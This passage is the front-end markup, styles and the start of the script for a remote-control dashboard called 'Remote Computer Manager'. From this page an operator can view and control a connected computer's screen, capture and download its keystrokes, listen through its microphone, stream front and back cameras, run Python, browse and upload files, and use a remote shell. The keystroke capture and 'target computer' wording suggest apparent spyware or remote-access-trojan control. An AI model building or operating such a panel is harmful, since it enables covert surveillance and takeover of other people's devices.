            position: absolute;
            width: 14px;
            height: 14px;
            margin: -7px 0 0 -7px;
            border-radius: 50%;
            border: 2px solid #ff7ab8;
            box-shadow: 0 0 16px rgba(255, 122, 184, 0.75);
            pointer-events: none;
            animation: live-ping 520ms ease-out forwards;
        }

        @keyframes live-ping {
            from {
                opacity: 0.95;
                transform: scale(0.45);
            }
            to {
                opacity: 0;
                transform: scale(3.4);
            }
        }

        /* ---------- LIVE SCREEN CONTROLS ---------- */

        .live-toggle-btn {
            padding: 5px 14px;
            font-size: 12px;
            border-radius: 6px;
            border: 1px solid #863a6c;
            background: #2a1424;
            color: #ff7ab8;
            cursor: pointer;
            transition: background 160ms ease, border-color 160ms ease;
            white-space: nowrap;
        }

        .live-toggle-btn:hover {
            background: #331528;
            border-color: #b3568f;
        }

        .live-mode-bar {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px;
            margin-top: 10px;
        }

        .live-mode-bar[hidden] {
            display: none;
        }

        .live-mode-label {
            font-size: 10px;
            letter-spacing: 1.6px;
            text-transform: uppercase;
            color: #8a5577;
            margin-right: 2px;
        }

        .live-mode-btn {
            padding: 6px 16px;
            border-radius: 999px;
            border: 1px solid #4a2239;
            background: #1a0d14;
            color: #d9a8c2;
            font-size: 12px;
            cursor: pointer;
            transition:
                background 160ms ease,
                border-color 160ms ease,
                color 160ms ease,
                box-shadow 160ms ease;
        }

        .live-mode-btn:hover {
            background: #2a1424;
            border-color: #b3568f;
            color: #ff9ecb;
        }

        .live-mode-btn.active {
            background: linear-gradient(135deg, #d9488f, #a92b6e);
            border-color: #ff7ab8;
            color: #fff;
            box-shadow: 0 0 18px rgba(255, 122, 184, 0.24);
        }

        .live-keys {
            display: flex;
            align-items: stretch;
            gap: 8px;
            margin-top: 10px;
        }

        .live-keys[hidden] {
            display: none;
        }

        .key-line {
            flex: 1;
            min-width: 0;
            min-height: 48px;
            max-height: 160px;
            overflow: auto;
            white-space: pre;
            padding: 11px 13px;
            border: 1px solid #4a2140;
            border-radius: 8px;
            background: #180d14;
            color: #ffe1ee;
            font-family: Consolas, monospace;
            font-size: 13px;
            line-height: 1.55;
            box-shadow: inset 0 0 26px rgba(0, 0, 0, 0.55);
        }

        .key-line:empty::before {
            content: "Keys typed on the controlled computer appear here.";
            color: #7c4668;
        }

        .key-download {
            flex: 0 0 auto;
            padding: 0 20px;
            border-radius: 8px;
            border: 1px solid #863a6c;
            background: #2a1424;
            color: #ff7ab8;
            font-size: 12px;
            cursor: pointer;
            transition: background 160ms ease, border-color 160ms ease;
        }

        .key-download:hover {
            background: #331528;
            border-color: #b3568f;
        }

        .live-stage.minimized {
            display: none;
        }

        .live-keyboard {
            display: none;
            margin-top: 10px;
            border: 1px solid #3e1c34;
            border-radius: 8px;
            background: #1a0d14;
            padding: 10px 12px;
        }

        .live-keyboard.visible {
            display: block;
        }

        .live-kb-row {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            margin-bottom: 5px;
        }

        .live-kb-row:last-child {
            margin-bottom: 0;
        }

        .kb-key {
            min-width: 34px;
            height: 32px;
            padding: 0 7px;
            border-radius: 5px;
            border: 1px solid #4a2239;
            background: #2a1424;
            color: #d9a8c2;
            font-family: Consolas, monospace;
            font-size: 12px;
            cursor: pointer;
            transition: background 100ms ease, color 100ms ease;
            user-select: none;
        }

        .kb-key:hover {
            background: #35172b;
            color: #ff7ab8;
            border-color: #c94e8c;
        }

        .kb-key:active, .kb-key.pressed {
            background: #4e2340;
            color: #ff7ab8;
            border-color: #ff7ab8;
        }

        .kb-key.wide { min-width: 60px; }
        .kb-key.wider { min-width: 80px; }
        .kb-key.space { flex: 1; min-width: 120px; }

        .live-kb-input-row {
            display: flex;
            gap: 6px;
            margin-top: 8px;
            align-items: center;
        }

        .live-kb-input-row input {
            flex: 1;
            background: #180d14;
            border: 1px solid #4a2140;
            border-radius: 5px;
            color: #ffe1ee;
            font-family: Consolas, monospace;
            font-size: 13px;
            padding: 5px 10px;
            outline: none;
        }

        .live-kb-input-row input:focus {
            border-color: #c94e8c;
        }

        .live-kb-hint {
            font-size: 11px;
            color: #7c4668;
            margin-top: 6px;
        }

        /* ---------- REMOTE CONSOLE ---------- */

        .console-screen {
            background: #180d14;
            border: 1px solid #4a2140;
            border-radius: 6px;
            padding: 14px 16px;
            height: 300px;
            overflow-y: auto;
            font-family: Consolas, monospace;
            font-size: 13px;
            line-height: 1.55;
            white-space: pre-wrap;
            overflow-wrap: anywhere;
            box-shadow: inset 0 0 30px rgba(0, 0, 0, 0.6);
            transition: border-color 200ms ease;
        }

        .console-screen:focus-within {
            border-color: #d9488f;
        }

        .console-line {
            animation: console-in 180ms ease both;
        }

        .console-echo {
            color: #ff7ab8;
        }

        .console-out {
            color: #f7dbe8;
        }

        .console-err {
            color: #ff8a9a;
        }

        .console-muted {
            color: #8a5577;
        }

        @keyframes console-in {
            from {
                opacity: 0;
                transform: translateY(2px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .console-input-row {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-top: 12px;
        }

        .console-prompt {
            color: #ff7ab8;
            font-family: Consolas, monospace;
            font-size: 13px;
            white-space: nowrap;
        }

        #consoleInput {
            flex: 1;
            min-width: 0;
            background: #180d14;
        }

        /* ---------- APP SHELL ---------- */

        body {
            padding: 0;
            background:
                radial-gradient(circle at 16% 0%, #3a142c 0%, transparent 52%),
                radial-gradient(circle at 88% 100%, #2c0f23 0%, transparent 55%),
                #160d13;
            background-attachment: fixed;
        }

        .app-shell[hidden],
        .view[hidden],
        .connect-view[hidden] {
            display: none !important;
        }

        .app-shell {
            display: grid;
            grid-template-columns: 250px minmax(0, 1fr);
            min-height: 100vh;
        }

        .sidebar {
            position: sticky;
            top: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            gap: 20px;
            padding: 24px 16px;
            background: rgba(24, 13, 20, 0.92);
            border-right: 1px solid #4a2140;
            backdrop-filter: blur(14px);
            overflow-y: auto;
        }

        .sidebar-brand {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 0 6px;
        }

        .sidebar-brand strong {
            display: block;
            color: #ffe1ee;
            font-size: 14px;
            letter-spacing: 0.3px;
            overflow-wrap: anywhere;
        }

        .sidebar-sub {
            color: #b98fa8;
            font-size: 10px;
            letter-spacing: 1.6px;
            text-transform: uppercase;
        }

        .brand-dot {
            flex: 0 0 auto;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #ff7ab8;
            box-shadow: 0 0 12px #ff7ab8;
        }

        .function-nav {
            min-height: 0;
        }

        .nav-label {
            margin: 0 0 10px;
            padding: 0 6px;
            color: #b98fa8;
            font-size: 10px;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        .nav-list {
            list-style: none;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .nav-item {
            width: 100%;
            text-align: left;
            padding: 10px 14px;
            background: transparent;
            color: #e7c4d8;
            border: 1px solid transparent;
            border-radius: 10px;
            font-family: Consolas, monospace;
            font-size: 13px;
            letter-spacing: 0.3px;
        }

        .nav-item:hover {
            background: #3a1a30;
            color: #fff4f9;
            transform: none;
            box-shadow: none;
        }

        .nav-item.active {
            background: linear-gradient(135deg, #d9488f, #ff7ab8);
            border-color: #ff9ecb;
            color: #2b0b16;
            font-weight: bold;
            box-shadow: 0 8px 22px rgba(217, 72, 143, 0.28);
        }

        .sidebar-bottom {
            margin-top: auto;
            display: flex;
            flex-direction: column;
            gap: 8px;
            padding-top: 16px;
            border-top: 1px solid #4a2140;
        }

        .sidebar-bottom .signout {
            text-align: center;
        }

        .disconnect {
            background: transparent;
            color: #ff9ecb;
            border: 1px solid #a03a78;
        }

        .disconnect:hover {
            background: #4a2140;
            box-shadow: none;
        }

        .main {
            width: 100%;
            max-width: 1180px;
            margin: 0 auto;
            padding: 26px;
        }

        .main-head {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
            gap: 14px;
            padding-bottom: 16px;
            margin-bottom: 22px;
            border-bottom: 1px solid #4a2140;
        }

        .main-head h1 {
            margin: 0;
            padding: 0;
            border-bottom: none;
            font-size: 20px;
        }

        .main-head-right {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .computer-pill {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 6px 12px;
            border: 1px solid #63304f;
            border-radius: 999px;
            background: #180d14;
            color: #ffe1ee;
            font-size: 12px;
        }

        .view-hint {
            margin: 0 0 14px;
            color: #b98fa8;
            font-size: 12px;
            letter-spacing: 0.3px;
        }

        .ghost {
            background: transparent;
            color: #ff9ecb;
            border: 1px solid #a03a78;
        }

        .ghost:hover {
            background: #4a2140;
        }

        /* ---------- CONNECT VIEW ---------- */

        .connect-view {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            background:
                radial-gradient(circle at 50% 16%, #3a142c 0%, transparent 60%),
                #160d13;
        }

        .connect-card {
            width: 100%;
            max-width: 460px;
            padding: 30px;
            border: 1px solid #63304f;
            border-radius: 18px;
            background: linear-gradient(160deg, rgba(51, 21, 40, 0.96), rgba(24, 13, 20, 0.98));
            box-shadow:
                0 30px 80px rgba(0, 0, 0, 0.55),
                0 0 46px rgba(217, 72, 143, 0.1);
            animation: panel-in 420ms ease both;
        }

        .connect-brand {
            display: flex;
            align-items: center;
            gap: 9px;
            margin-bottom: 18px;
            color: #ff9ecb;
            font-size: 11px;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        .connect-card h1 {
            margin: 0 0 8px;
            padding: 0;
            border-bottom: none;
            font-size: 24px;
        }

        .connect-sub {
            margin: 0 0 22px;
            color: #b98fa8;
            font-size: 13px;
            line-height: 1.55;
        }

        .device-tabs {
            display: flex;
            gap: 8px;
            margin-bottom: 12px;
        }

        .device-tab {
            flex: 1;
            padding: 10px 8px;
            background: transparent;
            border: 1px solid #63304f;
            border-radius: 7px;
            color: #b98fa8;
            font-family: Consolas, monospace;
            font-size: 11px;
            letter-spacing: 0.8px;
            text-transform: uppercase;
            cursor: pointer;
        }

        .device-tab:hover {
            background: #2a1222;
        }

        .device-tab.active {
            background: #c93b86;
            border-color: #c93b86;
            color: #fff4f9;
        }

        .connect-controls {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .connect-controls select {
            width: 100%;
            padding: 12px;
        }

        .connect-controls .row button {
            flex: 1;
        }

        #connectionStatus {
            margin: 16px 0 0;
            font-size: 12px;
            letter-spacing: 0.4px;
        }

        .connect-footer {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
            margin-top: 22px;
            padding-top: 18px;
            border-top: 1px solid #4a2140;
            color: #b98fa8;
            font-size: 11px;
        }

        @media (max-width: 860px) {
            .app-shell {
                grid-template-columns: 1fr;
            }

            .sidebar {
                position: static;
                height: auto;
                gap: 14px;
                padding: 16px;
                border-right: none;
                border-bottom: 1px solid #4a2140;
            }

            .nav-list {
                flex-direction: row;
                flex-wrap: wrap;
                padding-bottom: 4px;
            }

            .nav-item {
                width: auto;
                white-space: nowrap;
            }

            .sidebar-bottom {
                flex-direction: row;
                margin-top: 0;
                padding-top: 12px;
                border-top: none;
            }

            .sidebar-bottom > * {
                flex: 1;
            }

            .main {
                padding: 18px;
            }
        }

        /* ---------- CONSOLE-DRIVEN WEBSITE EFFECTS ---------- */

        html.theme-green { filter: hue-rotate(95deg) saturate(1.15); }
        html.theme-purple { filter: hue-rotate(35deg) saturate(1.2); }
        html.theme-red { filter: hue-rotate(-55deg) saturate(1.35); }
        html.theme-blue { filter: hue-rotate(195deg); }
        html.theme-yellow { filter: hue-rotate(60deg) saturate(1.5); }
        html.theme-dark { filter: brightness(0.68); }
        html.theme-light { filter: invert(1) hue-rotate(180deg); }
        html.theme-mono { filter: grayscale(1); }
        html.theme-hacker {
            filter: hue-rotate(95deg) saturate(1.75) brightness(0.72) contrast(1.3);
        }


        html.fx-mirror { transform: scaleX(-1); }

        body.fx-flip { transform: rotate(180deg); }
        body.fx-blur { filter: blur(2px); }
        body.fx-invert { filter: invert(1) hue-rotate(180deg); }
        body.fx-shake { animation: fx-shake 0.24s linear infinite; }
        body.fx-spin { animation: fx-spin 9s linear infinite; }

        body.fx-rainbow {
            background: linear-gradient(
                124deg,
                #ff2400,
                #e81d1d,
                #e8b71d,
                #1de840,
                #1ddde8,
                #2b1de8,
                #dd00f3,
                #ff2400
            );
            background-size: 1200% 1200%;
            animation: fx-rainbow 14s ease infinite;
        }

        body.fx-caps * {
            text-transform: uppercase !important;
        }

        body.fx-dyslexic,
        body.fx-dyslexic * {
            font-family:
                "Comic Sans MS",
                "Segoe Print",
                "Bradley Hand",
                cursive !important;
            letter-spacing: 0.06em;
            word-spacing: 0.18em;
        }

        @keyframes fx-shake {
            0%, 100% { transform: translate(0, 0); }
            25% { transform: translate(4px, -3px); }
            50% { transform: translate(-5px, 2px); }
            75% { transform: translate(3px, 4px); }
        }

        @keyframes fx-spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        @keyframes fx-rainbow {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
    </style>
</head>

<body>

<div id="connectView" class="connect-view">

    <div class="connect-card">

        <div class="connect-brand">
            <span class="brand-dot"></span>
            Remote Computer Manager
        </div>

        <h1>Connect to a computer</h1>

        <p class="connect-sub">
            Pick a Windows computer or a mobile device, then press Connect.
        </p>

        <div class="device-tabs">
            <button class="device-tab active" data-kind="desktop" onclick="selectDeviceKind('desktop')">Windows computers</button>
            <button class="device-tab" data-kind="mobile" onclick="selectDeviceKind('mobile')">Mobile devices</button>
        </div>

        <div class="connect-controls">

            <select id="computerSelect">
                <option value="">Loading computers...</option>
            </select>

            <div class="row">
                <button onclick="connectComputer()">Connect</button>
                <button class="ghost" onclick="refreshComputers()">Refresh</button>
            </div>

        </div>

        <p id="connectionStatus" class="status">
            Waiting for a computer...
        </p>

        <div class="connect-footer">
            <span>Computer missing? Make sure the client is running.</span>
            <a class="signout" href="/logout">Sign out</a>
        </div>

    </div>

</div>


<div id="homeView" class="app-shell" hidden>

    <aside class="sidebar">

        <div class="sidebar-brand">
            <span class="brand-dot"></span>
            <div>
                <strong id="sidebarComputer">Computer</strong>
                <span class="sidebar-sub" id="sidebarSub">Connected</span>
            </div>
        </div>

        <nav class="function-nav">
            <p class="nav-label">Functions</p>
            <ul class="nav-list" id="functionList">
                <li><button class="nav-item" data-panel="live" onclick="selectPanel('live')">Live Screen</button></li>
                <li><button class="nav-item" data-panel="screenshot" onclick="selectPanel('screenshot')">Screenshot</button></li>
                <li><button class="nav-item" data-panel="stream" onclick="selectPanel('stream')">Screen Share</button></li>
                <li><button class="nav-item" data-panel="mic" onclick="selectPanel('mic')">Microphone</button></li>
                <li><button class="nav-item" data-panel="camera" onclick="selectPanel('camera')">Camera</button></li>
                <li><button class="nav-item" data-panel="photos" onclick="selectPanel('photos')">Pictures</button></li>
                <li><button class="nav-item" data-panel="python" onclick="selectPanel('python')">Python</button></li>
                <li><button class="nav-item" data-panel="files" onclick="selectPanel('files')">Files</button></li>
                <li><button class="nav-item" data-panel="downloader" onclick="selectPanel('downloader')">Downloader</button></li>
                <li><button class="nav-item active" data-panel="console" onclick="selectPanel('console')">Console</button></li>
            </ul>
        </nav>

        <div class="sidebar-bottom">
            <button class="disconnect" onclick="disconnectComputer('Disconnected from the computer.')">
                Disconnect
            </button>
            <a class="signout" href="/logout">Sign out</a>
        </div>

    </aside>

    <main class="main">

        <div class="main-head">
            <h1 id="viewTitle">Live Screen</h1>
            <div class="main-head-right">
                <span class="computer-pill">
                    <span class="brand-dot"></span>
                    <span id="topComputer">Computer</span>
                </span>
                <button class="disconnect" onclick="disconnectComputer('Disconnected from the computer.')">
                    Disconnect
                </button>
            </div>
        </div>

<section class="panel view" data-view="live">

    <div class="live-screen-head">

        <div>
            <span id="liveScreenStatus" class="live-badge" aria-live="polite">
                <span class="dot"></span>
                <span id="liveScreenStatusText">Minimized</span>
            </span>
            <button id="liveToggleBtn" class="live-toggle-btn" onclick="liveToggleMaximize()">Maximize</button>
        </div>

    </div>

    <div id="liveStage" class="live-stage minimized" hidden>

        <div class="live-view">
            <img id="liveScreenImage" alt="Live remote screen" hidden>
        </div>

        <div class="live-scan"></div>

        <div class="live-hint">
            <span>Click anywhere on the screen to control that computer</span>
            <span class="live-hint-sub">Scroll, hold-click, and use the keyboard below</span>
        </div>

    </div>

    <div id="liveModeBar" class="live-mode-bar" hidden>
        <span class="live-mode-label">Input</span>
        <button class="live-mode-btn active" data-mode="keyboard" onclick="liveSetMode('keyboard')">Control keyboard</button>
        <button class="live-mode-btn" data-mode="keys" onclick="liveSetMode('keys')">See keys</button>
    </div>

    <div id="liveKeysPanel" class="live-keys" hidden>
        <div id="keyLine" class="key-line" aria-live="polite"></div>
        <button class="key-download" onclick="downloadKeyLog()" title="Download the captured keys as keyed.txt">Download</button>
    </div>

    <div id="liveKeyboard" class="live-keyboard" hidden>
        <div class="live-kb-row">
            <button class="kb-key" data-key="Escape">Esc</button>
            <button class="kb-key" data-key="F1">F1</button>
            <button class="kb-key" data-key="F2">F2</button>
            <button class="kb-key" data-key="F3">F3</button>
            <button class="kb-key" data-key="F4">F4</button>
            <button class="kb-key" data-key="F5">F5</button>
            <button class="kb-key" data-key="F6">F6</button>
            <button class="kb-key" data-key="F7">F7</button>
            <button class="kb-key" data-key="F8">F8</button>
            <button class="kb-key" data-key="F9">F9</button>
            <button class="kb-key" data-key="F10">F10</button>
            <button class="kb-key" data-key="F11">F11</button>
            <button class="kb-key" data-key="F12">F12</button>
            <button class="kb-key wide" data-key="Delete">Del</button>
        </div>
        <div class="live-kb-row">
            <button class="kb-key" data-key="`">`</button>
            <button class="kb-key" data-key="1">1</button>
            <button class="kb-key" data-key="2">2</button>
            <button class="kb-key" data-key="3">3</button>
            <button class="kb-key" data-key="4">4</button>
            <button class="kb-key" data-key="5">5</button>
            <button class="kb-key" data-key="6">6</button>
            <button class="kb-key" data-key="7">7</button>
            <button class="kb-key" data-key="8">8</button>
            <button class="kb-key" data-key="9">9</button>
            <button class="kb-key" data-key="0">0</button>
            <button class="kb-key" data-key="-">-</button>
            <button class="kb-key" data-key="=">=</button>
            <button class="kb-key wider" data-key="Backspace">&#9003;</button>
        </div>
        <div class="live-kb-row">
            <button class="kb-key wide" data-key="Tab">Tab</button>
            <button class="kb-key" data-key="q">Q</button>
            <button class="kb-key" data-key="w">W</button>
            <button class="kb-key" data-key="e">E</button>
            <button class="kb-key" data-key="r">R</button>
            <button class="kb-key" data-key="t">T</button>
            <button class="kb-key" data-key="y">Y</button>
            <button class="kb-key" data-key="u">U</button>
            <button class="kb-key" data-key="i">I</button>
            <button class="kb-key" data-key="o">O</button>
            <button class="kb-key" data-key="p">P</button>
            <button class="kb-key" data-key="[">[</button>
            <button class="kb-key" data-key="]">]</button>
            <button class="kb-key" data-key="\">\</button>
        </div>
        <div class="live-kb-row">
            <button class="kb-key wider" data-key="CapsLock">Caps</button>
            <button class="kb-key" data-key="a">A</button>
            <button class="kb-key" data-key="s">S</button>
            <button class="kb-key" data-key="d">D</button>
            <button class="kb-key" data-key="f">F</button>
            <button class="kb-key" data-key="g">G</button>
            <button class="kb-key" data-key="h">H</button>
            <button class="kb-key" data-key="j">J</button>
            <button class="kb-key" data-key="k">K</button>
            <button class="kb-key" data-key="l">L</button>
            <button class="kb-key" data-key=";">;</button>
            <button class="kb-key" data-key="'">'</button>
            <button class="kb-key wider" data-key="Enter">Enter</button>
        </div>
        <div class="live-kb-row">
            <button class="kb-key wider" data-key="Shift">Shift</button>
            <button class="kb-key" data-key="z">Z</button>
            <button class="kb-key" data-key="x">X</button>
            <button class="kb-key" data-key="c">C</button>
            <button class="kb-key" data-key="v">V</button>
            <button class="kb-key" data-key="b">B</button>
            <button class="kb-key" data-key="n">N</button>
            <button class="kb-key" data-key="m">M</button>
            <button class="kb-key" data-key=",">,</button>
            <button class="kb-key" data-key=".">.</button>
            <button class="kb-key" data-key="/">/</button>
            <button class="kb-key wider" data-key="Shift">Shift</button>
            <button class="kb-key" data-key="ArrowUp">&#8593;</button>
        </div>
        <div class="live-kb-row">
            <button class="kb-key wide" data-key="Control">Ctrl</button>
            <button class="kb-key wide" data-key="Meta">Win</button>
            <button class="kb-key wide" data-key="Alt">Alt</button>
            <button class="kb-key space" data-key=" ">Space</button>
            <button class="kb-key wide" data-key="Alt">Alt</button>
            <button class="kb-key wide" data-key="Control">Ctrl</button>
            <button class="kb-key" data-key="ArrowLeft">&#8592;</button>
            <button class="kb-key" data-key="ArrowDown">&#8595;</button>
            <button class="kb-key" data-key="ArrowRight">&#8594;</button>
        </div>
        <div class="live-kb-input-row">
            <input id="liveKbInput" type="text" placeholder="Type here and press Enter to send text..." autocomplete="off" spellcheck="false">
            <button class="kb-key wide" onclick="liveKbSendText()">Send</button>
        </div>
        <div class="live-kb-hint">Keys send immediately. Modifiers (Ctrl/Alt/Shift) toggle on/off. Text box sends typed characters.</div>
    </div>

</section>


<section class="panel view" data-view="screenshot" hidden>

    <p class="view-hint">
        Grab a single frame from the connected computer's screen.
    </p>

    <button onclick="requestScreenshot()">
        Capture Screenshot
    </button>

    <p id="screenshotStatus" class="muted">
        No screenshot requested.
    </p>

    <img id="screenshot" hidden>

</section>


<section class="panel view" data-view="stream" hidden>

    <div class="panel-header">
        <button id="streamButton" onclick="toggleStream()">
            Start Screen Share
        </button>
    </div>

    <p id="streamStatus" class="muted">
        Screen share is off.
    </p>

    <img id="streamImage" hidden>

</section>


<section class="panel view" data-view="mic" hidden>

    <div class="panel-header">
        <button id="micButton" onclick="toggleMicrophone()">
            Start Listening
        </button>
    </div>

    <p id="micStatus" class="muted">
        Microphone is off.
    </p>

    <progress id="micLevel" max="100" value="0"></progress>

</section>


<section class="panel view" data-view="camera" hidden>

    <div class="panel-header">
        <div class="row">
            <button id="cameraButton" onclick="toggleCamera()">
                Start Camera
            </button>
            <button id="cameraSnapshotButton" class="ghost" onclick="captureCameraFrame()">
                Single Frame
            </button>
        </div>
    </div>

    <p id="cameraStatus" class="muted">
        Camera is off.
    </p>

    <div class="camera-grid">
        <figure>
            <img id="cameraImage" alt="Back camera" hidden>
            <figcaption>Back camera</figcaption>
        </figure>
        <figure>
            <img id="cameraImageFront" alt="Front camera" hidden>
            <figcaption>Front camera</figcaption>
        </figure>
        <figure>
            <img id="cameraSnapshotImage" alt="Single frame" hidden>
            <figcaption>Single frame</figcaption>
        </figure>
    </div>

</section>


<section class="panel view" data-view="photos" hidden>

    <p class="view-hint">
        Pictures shared from the mobile device. The phone must pick them
        before they appear here.
    </p>

    <div class="panel-header">

        <div class="row">
            <button onclick="requestPhotos()">Request pictures</button>
            <button class="ghost" onclick="loadPhotos()">Refresh</button>
        </div>

    </div>

    <p id="photoStatus" class="muted">
        No pictures yet.
    </p>

    <div id="photoGrid" class="photo-grid"></div>

</section>


<section class="panel view" data-view="python" hidden>

    <div class="panel-header">

        <button id="pythonRunButton" onclick="runPython()">
            Run Python
        </button>

    </div>

    <p class="muted">
        Paste Python code below. It is saved to a temporary file
        and executed by the Python interpreter on the connected computer.
    </p>

    <textarea
        id="pythonCode"
        spellcheck="false"
        placeholder="print('hello from the target computer')"
    ></textarea>

    <p id="pythonStatus" class="muted">
        No code has been run.
    </p>

    <pre class="output" id="pythonOutput" hidden></pre>

</section>


<section class="panel view" data-view="files" hidden>

    <p class="view-hint">
        Browse the folders and files shared by the connected computer.
    </p>

    <p class="muted" id="rootLocation">
        Connect to a computer to browse its shared folder.
    </p>

    <div class="row">

        <input
            id="location"
            type="text"
            placeholder="C:/SharedFolder"
            onkeydown="if(event.key === 'Enter') navigateToFolder()"
        >

        <button onclick="navigateToFolder()">
            Open Directory
        </button>

        <button onclick="goToRoot()">
            Root Folder
        </button>

    </div>

    <h3>Output 1: Folders</h3>

    <div class="output" id="directoryTree">
        Connect to a computer to view folders.
    </div>

    <h3>Output 2: Files</h3>

    <div class="output" id="fileOutput">
        Connect to a computer to view files.
    </div>

    <p class="file-status" id="fileStatus"></p>

</section>


<section class="panel view" data-view="downloader" hidden>

    <p class="view-hint">
        Import a file or folder from this device and it will be
        downloaded into the RemoteAdmin folder on the connected computer.
    </p>

    <div class="dl-picker">

        <div class="row">

            <button onclick="document.getElementById('dlFileInput').click()">
                Choose files
            </button>

            <button onclick="document.getElementById('dlFolderInput').click()">
                Choose folder
            </button>

            <button class="ghost" onclick="clearDownloaderPicks()">
                Clear
            </button>

        </div>

        <input
            id="dlFileInput"
            type="file"
            multiple
            hidden
            onchange="downloadPickerChanged('files')"
        >

        <input
            id="dlFolderInput"
            type="file"
            webkitdirectory
            multiple
            hidden
            onchange="downloadPickerChanged('folder')"
        >

        <div id="dlPicked" class="dl-picked">
            <span class="dl-empty">Nothing selected yet.</span>
        </div>

    </div>

    <button id="dlSendButton" onclick="sendDownloaderFiles()">
        Send to RemoteAdmin
    </button>

    <p id="dlStatus" class="file-status"></p>

</section>


<section class="panel view" data-view="console" hidden>

    <div class="panel-header">

        <button onclick="clearConsole()">
            Clear
        </button>

    </div>

    <p id="consoleTarget" class="muted">
        Connect to a computer to use the console.
    </p>

    <div id="consoleOutput" class="console-screen" aria-live="polite">
        <div class="console-line console-muted">Remote shell ready. Type a command and press Enter.</div>
    </div>

    <div class="console-input-row">

        <span class="console-prompt">remote&gt;</span>

        <input
            id="consoleInput"
            type="text"
            placeholder="No computer connected"
            autocomplete="off"
            spellcheck="false"
            disabled
        >

        <button
            id="consoleRunButton"
            onclick="runConsoleCommand()"
            disabled
        >
            Run
        </button>

    </div>

</section>

    </main>

</div>


<div id="toastStack" class="toast-stack" aria-live="polite"></div>


<button
    id="logToggle"
    class="log-toggle"
    onclick="toggleLogDrawer()"
    title="Show the activity log"
>
    <span class="log-dot"></span>
    Activity Log
    <span id="logCount" class="log-count" hidden>0</span>
</button>


<div id="logDrawer" class="log-drawer" aria-hidden="true">

    <div class="log-header">

        <div class="log-title">
            <span class="log-dot"></span>
            Activity Log
        </div>

        <div class="log-actions">
            <button class="log-action" onclick="clearLogs()">
                Clear
            </button>

            <button
                class="log-action log-close"
                onclick="toggleLogDrawer(false)"
                aria-label="Close activity log"
            >
                &times;
            </button>
        </div>

    </div>

    <div class="log-tabs" role="tablist">
        <button
            class="log-tab active"
            data-log-tab="activity"
            role="tab"
            aria-pressed="true"
            onclick="showLogTab('activity')"
        >
            Activity
        </button>

        <button
            class="log-tab"
            data-log-tab="website"
            role="tab"
            aria-pressed="false"
            onclick="showLogTab('website')"
        >
            Website
        </button>

        <button
            class="log-tab"
            data-log-tab="devices"
            role="tab"
            aria-pressed="false"
            onclick="showLogTab('devices')"
        >
            Devices
        </button>
    </div>

    <div id="logList" class="log-list" data-log-pane="activity">
        <div class="log-empty">No activity yet.</div>
    </div>

    <div
        id="websiteLogList"
        class="log-list"
        data-log-pane="website"
        hidden
    >
        <div class="log-empty">No website entries stored yet.</div>
    </div>

    <div
        id="deviceLogList"
        class="log-list"
        data-log-pane="devices"
        hidden
    >
        <div class="log-empty">No device power events stored yet.</div>
    </div>

</div>


<script>

// Blocked sessions are sent straight to the block page, even if the
// dashboard never navigates anywhere.
const nativeFetch = window.fetch.bind(window);

window.fetch = async function(...args) {
    const response = await nativeFetch(...args);
    if (response.status === 403 && response.headers.get("X-Blocked") === "1") {
        window.location.reload();
    }
    return response;
};

let currentComputer = "";
let currentTree = null;
let currentFolder = "";
let currentRoot = "";
let currentKind = "desktop";
let deviceKind = "desktop";
let deviceList = [];
let photoPoll = null;

const DESKTOP_ONLY_PANELS = [
    "live", "screenshot", "stream", "files", "downloader", "python", "console"
];
const MOBILE_ONLY_PANELS = ["photos"];

const RENDER_CHUNK = 300;


// ==================================================
// API HELPER
// ==================================================

async function api(url, options = {}) {

    const response = await fetch(url, options);

    if (response.status === 401) {

        window.location.href =
            "/login?next=" +
            encodeURIComponent(
                window.location.pathname + window.location.search
            );

        throw new Error("Sign in required.");
    }

    if (!response.ok) {
        let message = await response.text();

        try {
            const data = JSON.parse(message);
            message = data.error || message;
        } catch {}

        throw new Error(message);
    }

    return response;
}


// ==================================================
// ACTIVITY LOG
// ==================================================

const LOG_LIMIT = 300;

let serverLogId = 0;
let logOpen = false;
let unreadLogs = 0;
let unreadErrors = 0;

let activeLogTab = "activity";
let siteLogId = readSiteCursor();

const toastTimers = new WeakMap();


function formatLogTime(seconds) {

    const date = new Date(
        (seconds || Date.now() / 1000) * 1000
    );

    return date.toLocaleTimeString([], {
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: false
    });
}


function updateLogBadge() {

    const badge = document.getElementById("logCount");

    if (!unreadLogs) {
        badge.hidden = true;
        return;
    }

    badge.hidden = false;

    badge.textContent =
        unreadLogs > 99 ? "99+" : String(unreadLogs);

    badge.classList.toggle(
        "error",
        unreadErrors > 0
    );
}


function buildLogRow(entry) {

    const row = document.createElement("div");

    row.className =
        "log-entry " + (entry.level || "info");

    const time = document.createElement("span");

    time.className = "log-time";
    time.textContent = formatLogTime(entry.time);

    const level = document.createElement("span");

    level.className = "log-level";
    level.textContent = entry.level || "info";

    const message = document.createElement("span");

    message.className = "log-message";
    message.textContent = entry.message || "";

    row.appendChild(time);
    row.appendChild(level);
    row.appendChild(message);

    return row;
}


function appendLogEntry(entry) {

    const list = document.getElementById("logList");

    const empty = list.querySelector(".log-empty");

    if (empty) {
        empty.remove();
    }

    list.appendChild(buildLogRow(entry));

    while (list.childElementCount > LOG_LIMIT) {
        list.firstElementChild.remove();
    }

    if (logOpen) {

